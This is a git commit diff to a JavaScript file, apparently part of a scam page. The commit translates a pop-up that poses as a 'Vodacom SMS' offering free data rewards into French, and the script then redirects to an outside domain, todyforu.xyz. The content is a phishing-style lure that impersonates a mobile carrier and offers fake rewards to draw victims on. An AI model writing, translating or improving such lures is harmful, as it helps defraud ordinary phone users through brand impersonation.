08b409cbbe34edcabd796955a3f18ccaa67c62b6
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-03 05:55:58 -0700

    Update vodacom-activation.js

--- vodacom-activation.js
+++ vodacom-activation.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('Vodacom SMS: Dear customer, kindly check if your Vodacom sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+password=prompt('Vodacom SMS: Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
 if (password != '1') {
 location.href='https://todyforu.xyz/vodacom';
 }
